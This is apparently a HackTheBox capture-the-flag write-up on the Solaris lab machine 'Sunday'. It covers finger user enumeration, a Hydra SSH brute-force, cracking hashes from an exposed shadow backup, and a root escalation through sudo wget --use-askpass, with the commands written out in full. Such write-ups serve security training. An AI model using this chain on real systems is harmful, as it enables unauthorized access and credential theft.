# HTB: Sunday — Writeup

**Target IP:** 10.129.51.248
**Attacker (Kali) IP:** 10.10.15.146

---

## 1. Reconnaissance

### 1.1 Port Scanning (RustScan)

```
┌──(root㉿kali)-[/home/kali/sunday]
└─# rustscan -a 10.129.51.248
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Scanning ports like it's my full-time job. Wait, it is.

Open 10.129.51.248:79
Open 10.129.51.248:111
Open 10.129.51.248:515
Open 10.129.51.248:6787
Open 10.129.51.248:22022
```

An unusual port set: **79 (finger)**, **111 (rpcbind)**, **515 (LPD/printer)**, **6787 (smc-admin)**, and SSH on a non-standard port, **22022**. This combination — particularly `rpcbind` + `smc-admin` — is a strong indicator of a **Solaris** host (smc-admin is the Solaris Management Console / Java Web Console service).

### 1.2 Service/Version Scan (Nmap)

```
┌──(root㉿kali)-[/home/kali/sunday]
└─# nmap -p79,111,515,6787,22022 -sCV -T4 10.129.51.248 -oA nmap/nmap
Starting Nmap 7.98 ( https://nmap.org ) at 2026-07-31 16:21 +0000
Nmap scan report for 10.129.51.248
Host is up (0.31s latency).

PORT      STATE SERVICE VERSION
79/tcp    open  finger?
| fingerprint-strings: 
|   GenericLines: 
|     No one logged on
|   GetRequest: 
|     Login Name TTY Idle When Where
|     HTTP/1.0 ???
.....
<snip — nmap's raw service-fingerprint submission blob (the long SF-Port79-TCP hex-escaped
string it prints when a service isn't in its signature database); purely diagnostic noise,
not needed since the finger service was already identified above>
.....
111/tcp   open  rpcbind 2-4 (RPC #100000)
515/tcp   open  printer
6787/tcp  open  http    Apache httpd
|_http-server-header: Apache
|_http-title: 400 Bad Request
22022/tcp open  ssh     OpenSSH 8.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 aa:00:94:32:18:60:a4:93:3b:87:a4:b6:f8:02:68:0e (RSA)
|_  256 da:2a:6c:fa:6b:b1:ea:16:1d:a6:54:a1:0b:2b:ee:48 (ED25519)

Nmap done: 1 IP address (1 host up) scanned in 125.73 seconds
```

Confirms **finger (79)**, **rpcbind (111)**, **printer/LPD (515)**, an **Apache** front-end for the management console on **6787**, and **OpenSSH 8.4** on **22022**.

### 1.3 Web Enumeration on Port 6787

```
┌──(root㉿kali)-[/home/kali/sunday]
└─# feroxbuster -u https://10.129.51.248:6787/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt -k 

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ https://10.129.51.248:6787/
 🚀  Threads               │ 50
───────────────────────────┴──────────────────────
302      GET        7l       18w      219c https://10.129.51.248:6787/ => https://10.129.51.248:6787/solaris/
302      GET        7l       18w      219c https://10.129.51.248:6787/solaris => https://10.129.51.248:6787/solaris/
302      GET        7l       18w      225c https://10.129.51.248:6787/solaris/login => https://10.129.51.248:6787/solaris/login/
```

Redirects to `/solaris/login/` — confirms this is the **Oracle Solaris Management Console** login page, and confirms the OS is Solaris. This requires valid Solaris credentials, so the next step was finding a valid username to attack via SSH instead.

---

## 2. Username Discovery via Finger (Port 79)

### 2.1 Nmap's Built-in Finger Script — No Luck

```
┌──(root㉿kali)-[/home/kali/sunday]
└─# nmap -p 79 --script finger --script-args finger.users=all 10.129.51.248
PORT   STATE SERVICE
79/tcp open  finger
|_finger: No one logged on\x0D
```

Nmap's `finger` NSE script (both with `finger.users=all` and with a large username wordlist afterward) only ever returned `"No one logged on"` — it doesn't actually attempt user-guessing against Solaris' finger daemon the way a dedicated enumeration tool does.

### 2.2 finger-user-enum.pl — Successful User Enumeration

Switched to **finger-user-enum.pl** (pentestmonkey) with a large name wordlist:

```
┌──(root㉿kali)-[/home/kali/sunday]
└─# ./finger-user-enum.pl -U /usr/share/wordlists/SecLists/usernames/Names/names.txt -t 10.129.51.248
Starting finger-user-enum v1.0 ( http://pentestmonkey.net/tools/finger-user-enum )

Worker Processes ......... 5
Usernames file ........... /usr/share/wordlists/SecLists/usernames/Names/names.txt
Target count ............. 1
Username count ........... 10735
Target TCP port .......... 79

######## Scan started at Fri Jul 31 19:03:25 2026 #########
access@10.129.51.248: access No Access User                     < .  .  .  . >..nobody4  SunOS 4.x NFS Anonym               < .  .  .  . >..
admin@10.129.51.248: Login       Name               TTY         Idle    When    Where..adm      Admin                              < .  .  .  . >..dladm    Datalink Admin                     < .  .  .  . >..netadm   Network Admin                      < .  .  .  . >..
.....
<snip — several more valid-but-irrelevant Solaris system/service account hits (bin, ike,
line, message, sys, and a handful of double-barrelled name-pair false positives like
"anne marie", "dee dee", "jo ann", "la verne", "miof mela", "zsa zsa" — an artifact of the
wordlist containing full names that partially match Solaris' finger output formatting).
The two entries that actually mattered are below.>
.....
root@10.129.51.248: root     Super-User            console      <Dec  7, 2023>..
sammy@10.129.51.248: sammy           ???            ssh          <May  6, 2025> 10.10.14.68         ..
sunny@10.129.51.248: sunny           ???            ssh          <Apr 13, 2022> 10.10.14.13         ..
######## Scan completed at Fri Jul 31 19:26:19 2026 #########
16 results.
```

Two real, non-system accounts stand out with prior SSH logon history: **`sammy`** and **`sunny`**.

---

## 3. SSH Brute-Force → Foothold as sunny

### 3.1 Hydra Against sunny

```
┌──(root㉿kali)-[/home/kali/sunday]
└─# hydra -l sunny -P /usr/share/wordlists/rockyou.txt ssh://10.129.51.248:22022
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak

[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://10.129.51.248:22022/
[STATUS] 916.00 tries/min, 916 tries in 00:01h, 14343484 to do in 260:59h, 15 active
[22022][ssh] host: 10.129.51.248   login: sunny   password: sunday
1 of 1 target successfully completed, 1 valid password found
```

**Cracked: `sunny` / `sunday`** — fittingly, the same as the machine's name.

### 3.2 Enumeration as sunny → Recovering shadow.backup

```
┌──(root㉿kali)-[/home/kali/sunday]
└─# ssh sunny@10.129.51.248 -p22022
sunny@sunday:/$ ls
backup    boot      dev       etc       home      lib       mnt       nfs4      platform  root      sbin      tmp       var
bin       cdrom     devices   export    kernel    media     net       opt       proc      rpool     system    usr       zvboot
sunny@sunday:/$ cd backup
sunny@sunday:/backup$ ls
agent22.backup  shadow.backup
sunny@sunday:/backup$ cat shadow.backup
mysql:NP:::::::
openldap:*LK*:::::::
webservd:*LK*:::::::
postgres:NP:::::::
svctag:*LK*:6445::::::
nobody:*LK*:6445::::::
noaccess:*LK*:6445::::::
nobody4:*LK*:6445::::::
sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::
sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::
```

A world-readable `shadow.backup` file in `/backup` exposed the real Solaris `sha256crypt` (`$5$`) password hashes for both **sammy** and **sunny**.

### 3.3 Cracking sammy's Hash (John)

```
┌──(root㉿kali)-[/home/kali/sunday]
└─# john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (sha256crypt, crypt(3) $5$ [SHA256 256/256 AVX2 8x])
Cost 1 (iteration count) is 5000 for all loaded hashes
cooldude!        (?)     
1g 0:00:03:23 DONE (2026-07-31 20:10) 0.004918g/s 1002p/s
Use the "--show" option to display all of the cracked passwords reliably
```

**Cracked: `sammy` / `cooldude!`**

---

## 4. SSH as sammy → user.txt

```
┌──(root㉿kali)-[/home/kali/sunday]
└─# ssh sammy@10.129.51.248 -p22022
(sammy@10.129.51.248) Password: 
Last login: Tue May  6 07:37:14 2025 from 10.10.14.68
Oracle Solaris 11.4.42.111.0                  Assembled December 2021
-bash-5.1$ whoami
sammy
-bash-5.1$ ls
user.txt
```

**User flag obtained.**

---

## 5. Privilege Escalation — Sudo `wget` (GTFOBins)

### 5.1 Checking Sudo Rights

```
-bash-5.1$ sudo -l
User sammy may run the following commands on sunday:
    (root) NOPASSWD: /usr/bin/wget
```

`sammy` can run **`/usr/bin/wget`** as root with no password. GTFOBins documents a sudo privilege-escalation technique for `wget` using its `--use-askpass` option, which lets you supply an arbitrary executable as the "password helper" — since that helper runs as root under `sudo`, pointing it at a shell script gives a root shell: [https://gtfobins.org/gtfobins/wget/](https://gtfobins.org/gtfobins/wget/)

### 5.2 Exploiting via `--use-askpass`

```
-bash-5.1$ echo -e '#!/bin/sh\n/bin/sh 1>&0' > /tmp/shell.sh
-bash-5.1$ chmod +x /tmp/shell.sh
-bash-5.1$ sudo wget --use-askpass=/tmp/shell.sh 0
root@sunday:/home/sammy# whoami
root
```

`wget --use-askpass` invokes `/tmp/shell.sh` as the password-prompt helper. Since the whole `wget` invocation runs as root via `sudo`, the helper script — which just spawns `/bin/sh` redirected onto the controlling terminal — executes as **root**, dropping a root shell.

### 5.3 Root Flag

```
root@sunday:/home/sammy# ls -la /root
total 42
drwx------   2 root     root          11 Aug  2 14:52 .
drwxr-xr-x  25 root     sys           28 Aug  2 14:50 ..
lrwxrwxrwx   1 root     root           9 Dec 19  2021 .bash_history -> /dev/null
-rw-r--r--   1 root     root         159 Aug 17  2018 .bashrc
-rw-------   1 root     root         766 Dec  7  2023 .viminfo
-rw-r--r--   1 root     root         126 Dec 19  2021 overwrite
-rw-------   1 root     root          33 Aug  2 14:52 root.txt
-rwxr-xr-x   1 root     root          53 Aug  2 17:34 troll
-rw-r--r--   1 root     root          53 Dec 19  2021 troll.original
```

**Root obtained.** `root.txt` confirmed present in `/root`.

---

## 6. Summary / Attack Chain

1. **Recon**: Nmap → an unusual, distinctly Solaris port set: finger (79), rpcbind (111), LPD (515), Solaris Management Console (6787), SSH on non-standard port 22022.
2. **Web recon**: The management console on 6787 redirected to `/solaris/login/`, confirming Solaris but requiring credentials — pushed enumeration toward finding a valid username instead.
3. **Username enumeration**: Nmap's built-in finger script came up empty; **finger-user-enum.pl** with a large name wordlist successfully enumerated real accounts, most notably **sammy** and **sunny**, both showing prior SSH logon history.
4. **Password brute-force**: Hydra found `sunny`'s SSH password matched the box's own name — **`sunny:sunday`**.
5. **Loot**: Logged in as sunny, found a world-readable `/backup/shadow.backup` containing sha256crypt hashes for both sunny and sammy.
6. **Cracking**: John cracked sammy's hash against rockyou.txt → **`sammy:cooldude!`**.
7. **User flag**: SSH login as **sammy** → `user.txt`.
8. **Privilege escalation**: `sudo -l` showed NOPASSWD rights on `/usr/bin/wget`. Per the GTFOBins wget entry, abused `--use-askpass` to run an arbitrary shell script as the password-prompt helper, which sudo executes as root → root shell → `root.txt`.

### Key Vulnerabilities Chained
- Finger service (port 79) enabled and enumerable, leaking valid usernames and their SSH login history
- Weak, guessable SSH password for `sunny` (the machine's own hostname)
- Sensitive backup file (`shadow.backup`) left world-readable, exposing crackable password hashes for other accounts
- Weak password for `sammy`, crackable via rockyou.txt
- Overly permissive `sudo` rule granting NOPASSWD access to `wget`, a GTFOBins-documented binary that can be abused for privilege escalation via `--use-askpass`
